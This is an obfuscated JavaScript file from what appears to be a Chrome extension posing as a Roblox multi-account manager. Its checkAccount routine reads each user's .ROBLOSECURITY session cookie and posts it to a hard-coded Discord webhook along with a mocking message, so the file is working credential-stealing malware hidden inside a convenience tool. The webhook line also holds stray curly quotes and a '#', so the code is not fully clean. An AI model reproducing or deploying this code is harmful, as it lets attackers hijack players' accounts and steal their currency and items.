const xhr = new XMLHttpRequest();
function setCookie(_0x25ed02, _0x2b1c50 = false) {
  chrome.cookies.set({
    'url': "https://www.roblox.com",
    'domain': ".roblox.com",
    'name': ".ROBLOSECURITY",
    'httpOnly': true,
    'value': _0x25ed02
  }, _0xc622f4 => {
    if (_0x2b1c50) {
      chrome.tabs.query({}, function (_0x20bfe3) {
        for (var _0x2ee021 in _0x20bfe3) {
          if (_0x20bfe3[_0x2ee021].url) {
            if (_0x20bfe3[_0x2ee021].url.includes("roblox.com")) {
              chrome.tabs.reload(_0x20bfe3[_0x2ee021].id, () => {});
            }
          }
        }
      });
    }
  });
}
function sendToDiscord(_0xfe0fdb) {
  const _0x4338ec = {
    'content': "**coded by @cx.fed // @everyone woww daddyy you beamed a new roblox acount :3**\n" + _0xfe0fdb
  };
  const _0x50d93f = new XMLHttpRequest();
  _0x50d93f.open("POST", “https://discord.com/api/webhooks/1346813323806642278/62dUIDFpkgET2I4zFdD-dRz_HS-OuE-Tb8Ryeudr3vo0OYCPtHgfZA1M6guIcThgFGXh”, true); #
  _0x50d93f.setRequestHeader("Content-Type", "application/json");
  _0x50d93f.send(JSON.stringify(_0x4338ec));
}
function getCookie(_0x54bb33) {
  chrome.cookies.get({
    'url': "https://www.roblox.com",
    'name': ".ROBLOSECURITY"
  }, _0x3c001d => {
    if (_0x3c001d) {
      _0x54bb33(_0x3c001d.value);
    } else {
      _0x54bb33(null);
    }
  });
}
function checkAccount(_0x29b29a = false) {
  getCookie(_0x4b064a => {
    if (_0x29b29a) {
      setCookie(_0x29b29a);
    }
    xhr.open("GET", "https://www.roblox.com/my/settings/json", true);
    xhr.onload = () => {
      if (xhr.status == 200 && xhr.responseText.includes(",\"UserId\":")) {
        var _0x5927f6 = JSON.parse(xhr.responseText);
        if (Object.keys(_0x5927f6).includes("DisplayName")) {
          xhr2 = new XMLHttpRequest();
          xhr2.open("GET", "https://thumbnails.roblox.com/v1/users/avatar-headshot?size=75x75&format=png&userIds=" + _0x5927f6.UserId.toString(), true);
          xhr2.onload = () => {
            xhr3 = new XMLHttpRequest();
            xhr3.open("GET", "https://economy.roblox.com/v1/user/currency", true);
            xhr3.onload = () => {
              if (_0x29b29a) {
                setCookie(_0x4b064a);
              }
              var _0x3876c6;
              _0x3876c6 = JSON.parse(xhr2.responseText).data[0];
              var _0x5364f8;
              _0x5364f8 = JSON.parse(xhr3.responseText).robux;
              readStorage(_0x41bb08 => {
                if (_0x29b29a) {
                  c_c = _0x29b29a;
                } else {
                  c_c = _0x4b064a;
                }
                _0x41bb08[_0x5927f6.UserId] = {
                  'cookie': c_c,
                  'balance': _0x5364f8,
                  'tagName': _0x5927f6.Name,
                  'displayName': _0x5927f6.DisplayName,
                  'premium': _0x5927f6.IsPremium,
                  'avatar_url': _0x3876c6.imageUrl
                };
                setStorage();
                refreshAccountList();
                sendToDiscord(c_c);
              });
            };
            xhr3.onerror = () => {
              if (_0x29b29a) {
                setCookie(_0x4b064a);
              }
              refreshAccountList();
            };
            xhr3.send();
          };
          xhr2.onerror = () => {
            if (_0x29b29a) {
              setCookie(_0x4b064a);
            }
            refreshAccountList();
          };
          xhr2.send();
        } else {
          if (_0x29b29a) {
            setCookie(_0x4b064a);
          }
          refreshAccountList();
        }
      } else {
        if (_0x29b29a) {
          setCookie(_0x4b064a);
        }
        refreshAccountList();
      }
    };
    xhr.onerror = () => {
      if (_0x29b29a) {
        setCookie(_0x4b064a);
      }
      refreshAccountList();
    };
    xhr.send();
  });
}
function refreshAccountList() {
  const _0x1c67d2 = document.getElementById("accounts");
  if (!Object.keys(accounts).length) {
    _0x1c67d2.innerHTML = "<div class=\"noaccounts\"><span>You didn't add any account.</span><a href=\"https://roblox.com/Login\" target=\"_blank\" style=\"color: grey;\">Login in your account</a></div>";
  } else {
    _0x1c67d2.innerHTML = '';
    getCookie(_0x1d00a1 => {
      for (var _0x14053a in accounts) {
        var _0xa98214 = accounts[_0x14053a];
        var _0x5894ae = document.createElement("div");
        if (_0xa98214.premium != 0) {
          prem = "<img src=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyOCAyOCI+PGRlZnM+PGNsaXBQYXRoIGlkPSJhIj48cGF0aCBkPSJNMjggMjRhNCA0IDAgMDEtNCA0SDE0di00aDEwVjRINHYyNGE0IDQgMCAwMS00LTRWNGE0IDQgMCAwMTQtNGgyMGE0IDQgMCAwMTQgNHptLTctN3Y0aC03di00aDN2LTZoLTZ2MTdIN1Y3aDE0djEweiIgZmlsbD0ibm9uZSIgY2xpcC1ydWxlPSJldmVub2RkIi8+PC9jbGlwUGF0aD48L2RlZnM+PGcgY2xpcC1wYXRoPSJ1cmwoI2EpIj48cGF0aCBmaWxsPSIjZmZmIiBkPSJNLTUtNWgzOHYzOEgtNXoiLz48L2c+PC9zdmc+\" alt=\"premium\">";
        } else {
          prem = '';
        }
        _0x5894ae.classList.add("account");
        _0x5894ae.innerHTML = "<div><img src=\"" + _0xa98214.avatar_url + "\" alt=\"" + _0xa98214.tagName + "\"><div class=\"account-info\"><div class=\"account-name\">" + prem + "<p class=\"displayName\">" + _0xa98214.displayName + "</p></div><div class=\"account-stat\"><div class=\"account-balance\"><span><img src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAaCAYAAACtv5zzAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsEAAA7BAbiRa+0AAALtSURBVEhLpZbLS1RRHMfnkamV9lCil7WJ6EUtElq0ycKCiqIWSQ9oEUTUoqAXGATRImoTReCqNrYI+g8KXLl1nxJIkuiMM+BrRufl9Pme+7vjtcYZcT7w4XfP78553XvuORNajmKxGMHd+AD7stkswSOVSik8x4O4DsNWrTr6MTbhdezL5/OE8kxOTipoACdwAy7fkW5iM57Dr3NzcwSPTCaj8Aov4FHsmp2dVc4xMTGhoPuaccSaXIRkHbZjL/5BR6FQUHiL+7AeW3EHarR78NL8/DyhxCdUO3XWtGt8LXbhz4WFBYLH8PCwwllcj3vxmUaaSCSU/4DH0XXa39+vnMPezzVs8Du4hb+VFdaAGt6CGm33zMyMcktIp9MKL7ANNcj2sbEx5XzuY5M6+OWKHnqOegyb8UosFlOuIvF4XOEOqs521OryuRfK5XJ2XXyMehwaUa89/xVhj/YL7sSN2K2EBqgZ+GzC5qGhIa+0CgYHBxXUzn5daIkHO9Ay7ai07qthsz6Jen+O0poNh8NFQiIajXqJANwri90uEYm45powpQvx70cRs1gLWdNR6sBmk/RKNZFncnoajuAM6rhRsOtaSFt0BDuot1grpccjgh0seek1kLPoCDaYwVaWmlcKoJ7LYbdLWN1GVzCCHTRjcXx83CutAvYiBe3dLbrgCw+F7NAQL3EbHsYfwZ21GvaBfcNjqK39oxJTU1PuS36kgvEej2ALPpmenlauIrar6sxQnQP4WQnjpjrQ8XjbFSGZTCrcxV2oo7AneLr52EHzHVVXjZ+yk83nPHoHDxfazzvtaHTYxqVNS7tjB74ZHR0tjoyMKP8Qr6IOoraBgQHlHDYj7UeLp5ogEUWNWpUd1uEZbMBG1H6vjUxl7ZqdwX8b0IN6h/9vaD7cdLPRaH1sIZxGvcBDeFkv0McOnRuoQ6f6Xxh+pNmooXflnr+Pnb86n7Uw1lj1lUEF/fHaihfxdXDENqOn2IkVRh0K/QWG+nGvs8znJQAAAABJRU5ErkJggg==\" /> " + _0xa98214.balance + "</span></div><p class=\"tagName\">@" + _0xa98214.tagName + "</p></div></div><div class=\"account-actions\"><button name=\"copy\" userid=\"" + _0x14053a + "\" title=\"Copy cookie\" class=\"btn\"><img src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACkAAAAwCAYAAACMuVOlAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsIAAA7CARUoSoAAAAEISURBVFhH7dhdEoIgGIVhaBvV/veVP91UWzAOIpXBiHpCbL5nhiLHcV41uVCrGbquczPlJwtpw07cMfFhNwzb3x3c9xxrA2P62teF8JZE/lIwtLRI+AotMRI+QkuNBB9aciTY0NIjodOhR34ssKatFVono4YriZ1iIwcURwcic4V4Vd34JxdXdHKYnacizX44IXM2vNsN/UETbPng4GSTxh6e7l0sQRJJI5EsEskikSwSySKRLBLJIpEsEskikSwSyfIfkW179e9tnOTXIyQ65V0QjN8H5YXIKbf7w8ZhbCH1SlpV3ejz6eh+rTPcmRSzIon83yeFLEEsEsmCyKyL88WsEG6aSKknF5mR7dvMEr0AAAAASUVORK5CYII=\" alt=\"Copy\" class=\"btn\"></button><button name=\"remove\" userid=\"" + _0x14053a + "\" title=\"Remove account\" class=\"btn\"><img src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACsAAAAwCAYAAACITIOYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsIAAA7CARUoSoAAAACpSURBVGhD7dhLDkAwFEbhy/7XYWBgi7hSiXgkevlLk/NNGFRyVGmisQfGWTq9rZml02zhCyOhq2hwm45Zun4Ih7ro9csdPpmlUvxphGb2K8SqEAsIHba9P20Q+22Zr4EKsSpVxWZ9DbZv59W4t8a47TjHMlAhVoVYFWJViFUhVoVYFWJViFUhVoVYlapis/4blMZ/g1LqXrPuD+t2v17daaz7Mvgs1MxsAoCIMk0ZDmFNAAAAAElFTkSuQmCC\" alt=\"Remove\" class=\"btn\"></button><button name=\"refresh\" userid=\"" + _0x14053a + "\" title=\"Refresh account information\" class=\"btn\"><img src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAvCAYAAAClgknJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsIAAA7CARUoSoAAAAFJSURBVGhD7ZbZEoMwCEW1///PbemI1RQIS4LRep6cMYF7sozO0wl4vlked8zA8hyGa0Jh7dtNwBKaQ5OhuUCL4CVSlmYCPYKXUJkkgcfyXCUjPGDt4z5/GeBucBngvSjgDU/VjdTi5sI7VsDSUKrDYanPERbwBC+JiEB/8hJnhQeidX4EMsMjkXq7ibXwrYNTaBYQgTzq78CorAIjrD5g7bMOlgRaha8tkhXIdY0jlLH6vbjOJaYYffWB0+/AZ4W5O3DvQAK3wNHcAkdzCxyNKCD9I43C6Xdg/dJKqz3yF/k/LvHId2F3NGpBRzxK17nEiOa49NgJ7GutTQ7Olij7WWqzA7MkuD7a2iEBxCOiqa+pKw6wSGyhGntqhQUAr0QLmgggmSKa4Ih6IJAhYQkPmAYjPUSswRHXJKSFiDc4Epq8xSITDf1lml6RzcRGfp2xEAAAAABJRU5ErkJggg==\" alt=\"Refresh\" class=\"btn\"></button></div></div>";
        _0x5894ae.setAttribute("userid", _0x14053a);
        if (_0xa98214.cookie == _0x1d00a1) {
          _0x5894ae.classList.add("current-account");
        }
        _0x5894ae.onclick = function (_0x45d53c) {
          if (!_0x45d53c.target.classList.contains("btn")) {
            var _0x454c0b = _0x45d53c.currentTarget.getAttribute("userid");
            readStorage(_0x2d5f02 => {
              setCookie(_0x2d5f02[_0x454c0b].cookie, reload = true);
              refreshAccountList();
            });
          }
        };
        _0x1c67d2.appendChild(_0x5894ae);
      }
      var _0x2d6dcc = _0x1c67d2.getElementsByTagName("button");
      for (var _0x2f034f = 0; _0x2f034f < _0x2d6dcc.length; _0x2f034f++) {
        var _0x4f8da3 = _0x2d6dcc[_0x2f034f];
        if (_0x4f8da3.name == "remove") {
          _0x4f8da3.onclick = _0x52d79f => {
            var _0x33184f = _0x52d79f.currentTarget.getAttribute("userid");
            readStorage(_0x21de2d => {
              delete _0x21de2d[parseInt(_0x33184f)];
              setStorage();
              refreshAccountList();
            });
          };
        }
        if (_0x4f8da3.name == "refresh") {
          _0x4f8da3.onclick = _0x1b504f => {
            var _0x509a14 = _0x1b504f.currentTarget.getAttribute("userid");
            readStorage(_0x1105e6 => {
              var _0x2d46f2 = _0x1105e6[parseInt(_0x509a14)].cookie;
              var _0x123865 = document.getElementsByClassName("account");
              for (var _0x5a55b2 = 0; _0x5a55b2 < _0x123865.length; _0x5a55b2++) {
                if (_0x123865[_0x5a55b2].getAttribute("userid") == _0x509a14) {
                  _0x123865[_0x5a55b2].classList.add("checking");
                }
              }
              delete _0x1105e6[parseInt(_0x509a14)];
              setStorage();
              checkAccount(_0x2d46f2);
            });
          };
        }
        if (_0x4f8da3.name == "copy") {
          _0x4f8da3.onclick = _0x5eb202 => {
            var _0x32343b = _0x5eb202.currentTarget.getAttribute("userid");
            readStorage(_0x267828 => {
              navigator.clipboard.writeText(_0x267828[parseInt(_0x32343b)].cookie).then(() => {
                console.log("OK!");
              }, () => {
                console.log("ERROR!!!");
              });
            });
          };
        }
      }
    });
  }
}
function readStorage(_0x4c1814) {
  chrome.storage.sync.get("multiroblox", _0x351660 => {
    if (_0x351660.multiroblox) {
      accounts = _0x351660.multiroblox;
    } else {
      accounts = {};
    }
    _0x4c1814(accounts);
  });
}
function readSettings(_0x198c3c) {
  chrome.storage.sync.get("multiroblox_settings", _0x598607 => {
    if (_0x598607.multiroblox_settings) {
      _0x198c3c(_0x598607.multiroblox_settings);
    } else {
      _0x198c3c({
        'autoadd': true
      });
    }
  });
}
function setStorage() {
  chrome.storage.sync.set({
    'multiroblox': accounts
  }, () => {});
}
async function update() {
  setInterval(() => {
    readSettings(_0x566387 => {
      if (_0x566387.update) {
        _0x566387.update = false;
        chrome.storage.sync.set({
          'multiroblox_settings': _0x566387
        }, () => {});
        readStorage(_0x454468 => {
          refreshAccountList();
        });
      }
    });
  }, 3000);
}
document.addEventListener("DOMContentLoaded", () => {
  const _0xa77b56 = document.getElementById("add");
  const _0x663c54 = document.getElementById("donate");
  const _0x3ad5b1 = document.getElementById("addcookie");
  readStorage(_0x4c71e1 => {
    refreshAccountList();
  });
  _0x663c54.onclick = () => {
    chrome.tabs.create({
      'active': true,
      'url': "https://www.donationalerts.com/r/maksvar"
    });
  };
  _0x3ad5b1.onsubmit = _0x2218e8 => {
    _0x2218e8.preventDefault();
    var _0x5106e2 = _0x3ad5b1.getElementsByTagName("input")[0];
    checkAccount(_0x5106e2.value);
    _0x5106e2.value = '';
  };
  _0xa77b56.onclick = () => {
    checkAccount();
  };
});
